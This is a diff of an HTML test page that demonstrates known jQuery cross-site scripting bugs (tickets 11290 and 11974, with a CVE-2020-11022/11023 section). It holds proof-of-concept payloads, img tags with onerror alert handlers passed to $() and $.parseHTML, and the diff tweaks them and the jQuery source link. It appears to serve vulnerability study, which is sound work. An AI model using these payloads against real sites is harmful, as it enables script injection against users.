@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <title>Jquery XSS</title>
-    <script type="text/javascript" src="https://xxxx.xxx/jquery/jquery.js"></script>
+    <script type="text/javascript" src="http://xxxx.xx/jquery/jquery.min.js"></script>
 </head>
 
 <body>
@@ -29,7 +29,7 @@
                 </li>
         <!-- 11974 -->
                 <li>
-                    <a href="#11974" onclick="xss(11974)">XSS-bug-11974</a>
+                    <a href="#11974" onclick="xss(11974);xss11974()">XSS-bug-11974</a>
                     =>
                     <a href="https://bugs.jquery.com/ticket/11974"target="_blank">ticket</a>
                 </li>
@@ -77,16 +77,16 @@
                 poc = 'div[data-val="<img src="x" onerror="alert(\'xss11290\')">"]';
                 break;
             case 11974:
-                poc = "<img src='z' onerror='alert(\"bug-11974\")'>";
+                poc = "<img src='z' onerror='alert(\"bug-11974-1\")'>";
                 break;
         }
         $(poc).appendTo("body");
     }
 
 // #11974
+
     function xss11974(){
-        $("<img src='z' onerror='alert(\"bug-11974\")'>");
-        // $.parseHTML("<img src='z' onerror='alert(\"bug-11974\")'>");
+        $.parseHTML("<img src='z' onerror='alert(\"bug-11974-2\")'>");
     }
 
 // CVE-2020-11022/CVE-2020-11023
